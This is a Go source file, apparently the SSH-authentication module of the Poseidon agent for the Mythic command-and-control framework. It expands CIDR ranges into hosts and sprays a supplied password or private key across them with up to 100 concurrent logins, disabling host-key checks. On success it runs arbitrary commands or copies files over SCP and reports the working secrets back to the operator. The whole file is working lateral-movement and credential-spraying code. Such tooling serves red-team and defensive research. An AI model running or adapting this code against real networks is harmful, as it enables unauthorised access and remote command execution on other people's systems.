package sshauth

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"sync"
	"time"

	// External
	"golang.org/x/crypto/ssh"
	"golang.org/x/sync/semaphore"

	// 3rd Party
	"github.com/tmc/scp"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
)

var (
	sshResultChan = make(chan SSHResult)
)

// SSHAuthenticator Governs the lock of ssh authentication attempts
type SSHAuthenticator struct {
	host string
	lock *semaphore.Weighted
}

// Credential Manages credential objects for authentication
type Credential struct {
	Username   string
	Password   string
	PrivateKey string
}

type SSHTestParams struct {
	Hosts       []string `json:"hosts"`
	Port        int      `json:"port"`
	Username    string   `json:"username"`
	Password    string   `json:"password"`
	PrivateKey  string   `json:"private_key"`
	Command     string   `json:"command"`
	Source      string   `json:"source"`
	Destination string   `json:"destination"`
}

type SSHResult struct {
	Status     string `json:"status"`
	Success    bool   `json:"success"`
	Username   string `json:"username"`
	Secret     string `json:"secret"`
	Output     string `json:"output"`
	Host       string `json:"host"`
	CopyStatus string `json:"copy_status"`
}

// SSH Functions
func PublicKeyFile(file string) (ssh.AuthMethod, error) {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil, err
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil, err
	}
	return ssh.PublicKeys(key), nil
}

func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string) {
	res := SSHResult{
		Host:     host,
		Username: cred.Username,
		Success:  true,
	}
	var sshConfig *ssh.ClientConfig
	if cred.PrivateKey == "" {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         500 * time.Millisecond,
			Auth:            []ssh.AuthMethod{ssh.Password(cred.Password)},
		}
	} else {
		sshAuthMethodPrivateKey, err := PublicKeyFile(cred.PrivateKey)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			sshResultChan <- res
			return
		}
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			Timeout:         500 * time.Millisecond,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Auth:            []ssh.AuthMethod{sshAuthMethodPrivateKey},
		}
	}
	// log.Println("Dialing:", host)

	if cred.PrivateKey == "" {
		res.Secret = cred.Password
		// successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.Password)
	} else {
		res.Secret = cred.PrivateKey
		// successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.PrivateKey)
	}
	connectionStr := fmt.Sprintf("%s:%d", host, port)
	connection, err := ssh.Dial("tcp", connectionStr, sshConfig)
	if err != nil {
		if debug {
			errStr := fmt.Sprintf("[DEBUG] Failed to dial: %s", err)
			fmt.Println(errStr)
		}
		res.Success = false
		res.Status = err.Error()
		sshResultChan <- res
		return
	}
	defer connection.Close()
	session, err := connection.NewSession()
	defer session.Close()
	if err != nil {
		res.Success = false
		res.Status = err.Error()
		sshResultChan <- res
		return
	}
	if source != "" && destination != "" {
		err = scp.CopyPath(source, destination, session)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			res.CopyStatus = "Failed to copy: " + err.Error()
		} else {
			res.CopyStatus = "Successfully copied"
		}
	}
	if command != "" {
		modes := ssh.TerminalModes{
			ssh.ECHO:          0, //disable echoing
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}
		err = session.RequestPty("xterm", 80, 40, modes)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			res.Output = "Failed to request PTY"
			sshResultChan <- res
			return
		}
		output, err := session.Output(command)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
		} else {
			res.Output = string(output)
		}

	} else {
		res.Output = ""
	}
	//session.Close()
	sshResultChan <- res
}

func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool, command string, source string, destination string) {
	wg := sync.WaitGroup{}

	for i := 0; i < len(creds); i++ {
		auth.lock.Acquire(context.TODO(), 1)
		wg.Add(1)
		go func(port int, cred Credential, debug bool, command string, source string, destination string) {
			SSHLogin(auth.host, port, cred, debug, command, source, destination)
			wg.Done()
			auth.lock.Release(1)
		}(port, creds[i], debug, command, source, destination)
	}
	wg.Wait()
}

func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
	var lim int64 = 100
	auth := &SSHAuthenticator{
		host: host,
		lock: semaphore.NewWeighted(lim),
	}
	auth.Brute(port, creds, debug, command, source, destination)
}

func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string) []SSHResult {
	for i := 0; i < len(hosts); i++ {
		go SSHBruteHost(hosts[i], port, creds, debug, command, source, destination)
	}
	var successfulHosts []SSHResult
	for i := 0; i < len(hosts); i++ {
		res := <-sshResultChan
		//if res.Success {
		//	successfulHosts = append(successfulHosts, res)
		//}
		successfulHosts = append(successfulHosts, res)
	}
	return successfulHosts
}

func Run(task structs.Task) {

	params := SSHTestParams{}
	msg := task.NewResponse()

	// log.Println("Task params:", string(task.Params))
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}
	// log.Println("Parsed task params!")
	if len(params.Hosts) == 0 {
		msg.UserOutput = "Missing host(s) parameter."
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if params.Password == "" && params.PrivateKey == "" {
		msg.UserOutput = "Missing password parameter"
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if params.Username == "" {
		msg.UserOutput = "Missing username parameter."
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	var totalHosts []string
	for i := 0; i < len(params.Hosts); i++ {
		newCidr, err := portscan.NewCIDR(params.Hosts[i])
		if err != nil {
			continue
		} else {
			// Iterate through every host in hostCidr
			for j := 0; j < len(newCidr.Hosts); j++ {
				totalHosts = append(totalHosts, newCidr.Hosts[j].PrettyName)
			}
			// cidrs = append(cidrs, newCidr)
		}
	}

	if params.Port == 0 {
		params.Port = 22
	}

	cred := Credential{
		Username:   params.Username,
		Password:   params.Password,
		PrivateKey: params.PrivateKey,
	}
	// log.Println("Beginning brute force...")
	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination)
	// log.Println("Finished!")
	if len(results) > 0 {
		data, err := json.MarshalIndent(results, "", "    ")
		// // fmt.Println("Data:", string(data))
		if err != nil {
			msg.UserOutput = err.Error()
			msg.Completed = true
			msg.Status = "error"
			task.Job.SendResponses <- msg
			return
		} else {
			// fmt.Println("Sending on up the data:\n", string(data))
			msg.UserOutput = string(data)
			msg.Completed = true
			task.Job.SendResponses <- msg
			return
		}
	} else {
		// log.Println("No successful auths.")
		msg.UserOutput = "No successful authentication attempts"
		msg.Completed = true
		task.Job.SendResponses <- msg
		return
	}

}
